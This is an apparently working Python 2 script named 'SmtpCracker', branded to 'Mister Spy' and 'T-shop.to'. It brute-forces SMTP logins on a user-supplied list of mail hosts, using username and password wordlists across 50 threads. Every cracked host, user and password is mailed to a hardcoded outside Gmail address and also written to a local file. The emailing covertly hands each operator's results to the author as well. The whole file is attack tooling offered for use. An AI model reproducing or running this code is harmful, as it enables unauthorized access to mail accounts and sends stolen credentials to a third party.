import os
import random
import smtplib
import sys
import threading
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing.dummy import Pool
from random import choice

from colorama import *
from colorama import Fore, Back, init

init()

la7mar = '\033[91m'
lazra9 = '\033[94m'
la5dhar = '\033[92m'
movv = '\033[95m'
lasfar = '\033[93m'
ramadi = '\033[90m'
blid = '\033[1m'
star = '\033[4m'
bigas = '\033[07m'
bigbbs = '\033[27m'
hell = '\033[05m'
saker = '\033[25m'
labyadh = '\033[00m'
cyan = '\033[0;96m'


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """


 _____           _         _____                _             
/  ___|         | |       /  __ \              | |            
\ `--. _ __ ___ | |_ _ __ | /  \/_ __ __ _  ___| | _____ _ __ 
 `--. \ '_ ` _ \| __| '_ \| |   | '__/ _` |/ __| |/ / _ \ '__|
/\__/ / | | | | | |_| |_) | \__/\ | | (_| | (__|   <  __/ |   
\____/|_| |_| |_|\__| .__/ \____/_|  \__,_|\___|_|\_\___|_|   
                    | |                                       
                    |_|                                       

Mister Spy
T-shop.to

"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)


cls()
print_logo()


def login(site):
    try:
        for user in userlist:
            for passx in passlist:
                try:
                    smtp = smtplib.SMTP()
                    smtp.connect(site, 25)
                    smtp.login(user + '@' + site, passx)
                    sender = user + '@' + site
                    receivers = ['moetazbusiness@gmail.com']
                    message = site + '|25|' + user + '@' + site + '|' + passx
                    smtp.sendmail(sender, receivers, message)
                    print la5dhar + "[+] Successful Cracked =>", site + ' ' + user + '@' + site + ' ' + passx + ' \n' + labyadh
                    open("Cracked.txt", "a").write(site + '|25|' + user + '@' + site + '|' + passx + '\n')
                    smtp.quit()
                    # go out from the fucking loop
                    return True
                except:
                    print lazra9 + "[-] Trying -->" + ' Host -> [' + site + ']|' + user + '@' + site + '|' + passx + ' \n' + labyadh

    except:
        pass


passlist = open('pass.txt', "r").read().splitlines()
userlist = open('users.txt', "r").read().splitlines()
a = raw_input('Give Ur List: ')
ob = open(a, 'r')
lists = ob.readlines()
list1 = []
i = 0
for i in range(len(lists)):
    list1.append(lists[i].strip('\n'))
count = 0

# try:
p = Pool(50)
# pool = ThreadPool(12)
# https://www.facebook.com/007MrSpy/
results = p.map(login, [site.rstrip() for site in (list1)])
